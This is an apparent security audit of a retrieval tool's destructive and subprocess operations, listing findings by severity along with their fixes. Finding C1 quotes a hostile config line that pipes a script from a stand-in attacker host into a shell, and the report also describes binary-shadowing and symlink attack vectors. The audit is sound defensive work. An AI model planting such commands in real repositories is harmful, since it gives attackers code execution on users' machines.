---
tags:
  - '#audit'
  - '#destructive-ops-security'
date: '2026-06-19'
modified: '2026-06-30'
related: []
---

# `destructive-ops-security` audit: `destructive file operations security audit`

## Scope

Codebase-wide security assessment of every destructive or dangerous operation
in `vaultspec-rag` (audit branch off `main` at `ab28b7e`), conducted from a
cyber-security / attack-vector lens. Four parallel reviewers covered: (1) the
managed-binary download -> verify -> extract -> execute supply chain; (2) the
document-preprocessing subsystem that runs user-configured commands; (3) every
file/dir/collection deletion and overwrite path (blast radius, traversal,
symlink); (4) the process-spawn / subprocess surface (injection, PATH/env,
Windows). Read-only review; no code changed by the audit.

Overall posture is strong: no `shell=True` anywhere, all spawns are list-argv,
the service token never appears in argv or a child env, listeners and probes are
loopback-pinned, the chunk pool uses `spawn`, the pinned-binary verify-before-
extract boundary holds, collection drops are surgical, deletes use write-tmp +
`os.replace` atomics, and `--remove-data` guards symlinks. The exceptions below
are the exposure.

## Findings

### CRITICAL

- **C1 | preprocess RCE on untrusted repos** | `indexer/_preprocess_config.py`
  (load from project root), `indexer/_preprocess_runner.py` (spawn),
  `indexer/_preprocess_entry.py` (import+call), auto-triggered by `watcher.py`.
  A `.vaultragpreprocess.toml` lives in the indexed project tree and declares a
  `command` (run as a subprocess) or `entry_point` (`module:func`, imported and
  called) for every file matching a glob. There is no opt-in, allowlist, or
  confirmation: cloning and indexing - or merely letting the resident watcher
  see - an untrusted repo executes its declared commands with the operator's
  privileges. Example: a repo shipping `command = "curl -s evil.sh | sh"` for
  `pattern = "*.md"` pops a shell on first scan; `entry_point` is a parallel
  arbitrary-Python channel that also resolves against the daemon's `sys.path`.
  "Index this directory" silently means "execute this directory's code." This is
  the single highest-impact finding. Fix: gate all preprocess `command`/
  `entry_point` execution behind an explicit per-root opt-in (env/flag), off by
  default, plus trust-on-first-use confirmation of the command set keyed on the
  config's content hash (re-confirm on change); document the trust model loudly.

### HIGH

- **H1 | preprocess unbounded default timeout (watcher DoS)** |
  `indexer/_preprocess_config.py` `_resolve_timeout` returns `None` when
  `timeout_s` is omitted, and the runner passes `None` to `proc.wait` (wait
  forever). A rule that omits the timeout and blocks hangs the indexer/watcher
  indefinitely - with C1, an untrusted repo trivially wedges the resident
  service. Fix: a sane non-`None` default ceiling (e.g. 60-120s); never pass
  `timeout=None` on a project-supplied command.
- **H2 | preprocess filename argv injection (CWE-88)** |
  `indexer/_preprocess_runner.py` `_build_argv`. Token-wise `{path}`
  substitution defeats shell injection but a source file whose name begins with
  `-` is delivered to the child as an option, not an operand (no `--` / `./`
  guard). A committed filename like `--output=...` can alter extractor
  behaviour. Fix: insert a `--` separator before path operands or `./`-prefix a
  `-`-leading relative path.
- **H3 | env-var binary runs unverified and outranks the verified install** |
  `qdrant_runtime/_resolve.py` (env source returned first, no sha256) +
  `_supervise.py` (re-hash gate only fires for `source == "provisioned"`).
  Anyone who can set `VAULTSPEC_RAG_QDRANT_BINARY` in the service environment
  runs an arbitrary executable as the service user, silently shadowing a
  correctly provisioned, pinned binary with no execution-time signal. Fix: WARN
  loudly when an env/PATH binary is selected; require an explicit trust opt-in
  before an unpinned binary may outrank a verified install.
- **H4 | PATH-resolved qdrant binary runs unverified** |
  `qdrant_runtime/_resolve.py` falls back to `shutil.which("qdrant")` with no
  digest; `_supervise.py` skips the hash gate for `source == "path"`. A
  `qdrant`/`qdrant.exe` planted earlier on PATH (or, on Windows, an early search
  dir) executes as the daemon user when server mode starts - automatic, not an
  operator choice. Fix: refuse or explicit-opt-in the PATH branch; at minimum
  WARN at startup that an unverified binary ran.
- **H5 | operator `--binary` copy follows symlinks (TOCTOU)** |
  `qdrant_runtime/_provision.py` `_provision_operator_binary` uses
  `shutil.copyfile` (dereferences a symlink at the source path) before hashing,
  so on a shared/attacker-influenced dir the blessed content can be swapped
  between operator intent and copy. Fix: `resolve(strict=True)` and refuse
  symlinked source paths.

### MEDIUM

- **M1 | empty `VAULTSPEC_RAG_*` path env repoints blast radius** | `config.py`
  `_resolve_rag_default` treats `""` as a present override, so an empty
  `VAULTSPEC_RAG_STATUS_DIR`/`DATA_DIR`/`QDRANT_STORAGE_DIR` resolves to cwd
  (`Path("").expanduser()` == `.`). `server qdrant clean` then iterates/rmtrees
  `./bin/qdrant/*` in the cwd; all managed-dir ops relocate. The persistence
  helper at `config.py` `_status_dir_path` already collapses `""` to default via
  `... or DEFAULT`, so the two resolution paths disagree. Fix: treat empty/
  whitespace path env values as absent; assert the two resolvers agree.
- **M2 | `clean_provisioned` follows a Windows junction/symlink in rmtree** |
  `qdrant_runtime/_provision.py`. `child.is_dir()` is True for a junction/
  reparse point and `shutil.rmtree` deletes through it on Windows. The sibling
  `--remove-data` path guards this (symlink refusal + `onexc` unlink); this one
  does not. Fix: refuse symlinks/reparse points and add the same `onexc` guard.
- **M3 | extraction destination symlink TOCTOU** |
  `qdrant_runtime/_provision.py` `_extract_binary_member` opens the dest with
  `open(out_path, "wb")`; a pre-planted symlink at the managed dest could
  redirect the write. (Upstream SHA pin makes a tampered archive already fail, so
  defense-in-depth.) Fix: `os.open(..., O_CREAT|O_EXCL|O_NOFOLLOW)`.
- **M4 | over-broad permissions on managed artifacts** |
  `qdrant_runtime/_provision.py` chmods the binary world-executable;
  `_supervise.py`/`cli/_process.py` open logs `0o666`; the managed dir is umask-
  default. On a multi-user host this widens who can run/tamper. Fix: `0o700` dir,
  `0o600` logs, owner-only exec bit; `O_NOFOLLOW` on the log open.
- **M5 | loopback probes honour `HTTP_PROXY`** | `qdrant_runtime/_supervise.py`
  `_ready_probe`/`server_version` use bare `urllib.request.urlopen`, which routes
  through a proxy env var - a proxy could spoof readiness/version. Fix: an opener
  with an empty `ProxyHandler({})` for loopback probes.
- **M6 | qdrant child inherits the full daemon env** |
  `qdrant_runtime/_supervise.py` `_child_env` does `dict(os.environ)` then
  overlays `QDRANT__*`, exposing any daemon secrets to the child unnecessarily.
  Fix: pass a curated minimal env (PATH/TEMP/SystemRoot + QDRANT\_\_\*).

### LOW

- L1 | `entry_point` import side effects are an in-repo arbitrary-Python channel
  (subsumed by C1's gate). L2 | preprocess cache temp file named by PID only
  (minor TOCTOU; cache dir is owner-only). L3 | `clean_provisioned` bare rmtree
  has no `onexc`/atomic-rename (partial-delete leaves a half-install). L4 |
  `uninstall --remove-data` lacks a resolved-path preview before the real run.
  L5 | partial extracted binary not cleaned on mid-extract failure. L6 | Windows
  Job-Object assignment failure only warns (orphan guard silently void).

### Positives (recorded; preserve these)

No `shell=True`/`os.system`/shell strings anywhere; all spawns list-argv. Service
token never in argv nor child env (uuid4 in a loopback header + `service.json`
only). All listeners/probes loopback-pinned; health probe rejects redirects.
Chunk pool is `spawn`; worker import chain torch-free with a regression guard.
Pinned-binary boundary: committed SHA constants (never live metadata), HTTPS
host-pin with redirect re-check, no `extractall` (single member flattened by
basename), pre-exec re-hash of the provisioned binary. Collection drops are
surgical (`delete_collection`, not whole-dir rmtree) and the historical
whole-tree wipe is regression-guarded. `--remove-data` refuses symlinked targets
and installs an `onexc` unlink guard. Log rotation deletes only deterministic
`name.N` backups (no scan-then-delete). All sidecar writes use write-tmp +
`os.replace`. Windows kill-on-close Job Object is correct; `stop` validates PID
ownership before terminating.

## Recommendations

- **Fix C1 first** (the only CRITICAL): make preprocess command/entry_point
  execution opt-in and off by default, with trust-on-first-use confirmation of
  the command set; treat a project-supplied `.vaultragpreprocess.toml` as code.
  This is the difference between "index a repo" being safe vs. RCE.
- Then the binary-trust HIGHs (H3/H4/H5): make any unpinned binary source
  (env/PATH/operator-copy) loud and/or opt-in, and never let it silently outrank
  a verified install; refuse symlinked operator sources.
- Then preprocess H1 (default timeout ceiling) and H2 (argv operand guard).
- Schedule the MEDIUMs (empty-env path collapse M1; Windows junction M2; dest
  `O_NOFOLLOW` M3; perms M4; proxy-free probes M5; curated child env M6).
- Each finding is independent and localized; fixes warrant their own issues/PRs
  and real-backend tests (no mocks), separate from the storage-lifecycle PR.

## Resolution

All findings fixed on this branch (commits `de4bde9`, `7eedbf6`, `5563f11`);
`1025` unit tests pass, ruff / ty / basedpyright clean.

- **C1 RESOLVED** - preprocessing is OFF by default; `load_preprocess_rules`
  returns empty (loud warning) unless `VAULTSPEC_RAG_PREPROCESS_ENABLED=1`, so an
  untrusted repo's commands never load or run on index/watch. Test: disabled gate
  ignores a present config.
- **H1 RESOLVED** - omitted `timeout_s` defaults to 120s (cap 1800s); never
  wait-forever. **H2 RESOLVED** - `-`-leading path operand `./`-prefixed.
- **H3/H4 RESOLVED** - env/PATH binaries log a loud UNVERIFIED warning and flag
  when shadowing a verified install (`has_provisioned_binary`). **H5 RESOLVED** -
  symlinked operator `--binary` refused (`follow_symlinks=False`); test added.
- **M1 RESOLVED** - empty/whitespace path env treated as absent (no cwd
  collapse); tests added. **M2** - `clean_provisioned` skips symlinks/junctions +
  `onexc`. **M3** - extraction dest `O_NOFOLLOW` + symlink unlink. **M4** - binary
  `0o700`, logs `0o600`+`O_NOFOLLOW`. **M5** - proxy-free loopback probes. **M6** -
  curated qdrant child env (no daemon secrets).
- **L2** - random cache temp name. **L4** - uninstall `--remove-data` previews
  resolved path + size. **L5** - partial binary cleaned on failure. **L6** -
  orphan-guard failure logged at error. **L3** - covered by M2's `onexc`.
- **L1 (N/A here)** - the unused `storage_safety` guard lives on the
  storage-lifecycle branch (PR #196), not `main`; wire it when a local-mode
  tree-delete lands there.

**Round-2 review** (3 reviewers, all PASS - the C1 gate was traced bypass-free
including the cache path; M1 and the binary fixes confirmed correct; the 6 new
tests confirmed real, no mocks/skips). Follow-ups landed in `6fef2ad`: pass
`RUST_BACKTRACE`/`RUST_LOG` to the qdrant child (M6 diagnosability), an
end-to-end integration test proving a disabled gate does not execute a command
rule on index (the real C1 proof), and no-GPU tests for `has_provisioned_binary`,
`clean_provisioned` symlink-skip, and the curated `_child_env`.

## Codification candidates

Two strong candidates, to promote once the fixes land and have held a cycle
(per the codify discipline: not on first encounter):

- **Source:** finding C1 (preprocess config is arbitrary code execution).
  **Rule slug:** `preprocess-config-is-code-execution`.
  **Rule:** A project-supplied preprocess config (`.vaultragpreprocess.toml`)
  may run `command`/`entry_point` only behind an explicit, off-by-default
  per-root opt-in plus trust-on-first-use confirmation of the command set;
  indexing or watching a repo must never execute its declared code by default.

- **Source:** findings H3/H4/H5 (env/PATH/operator binaries bypass the pin).
  **Rule slug:** extend the existing `pinned-binaries-verify-before-execute`.
  **Rule:** Every binary source - provisioned, operator `--binary`, env var, and
  PATH - must be verified-or-loudly-untrusted before execution; an unpinned
  source must never silently outrank a verified provisioned install.
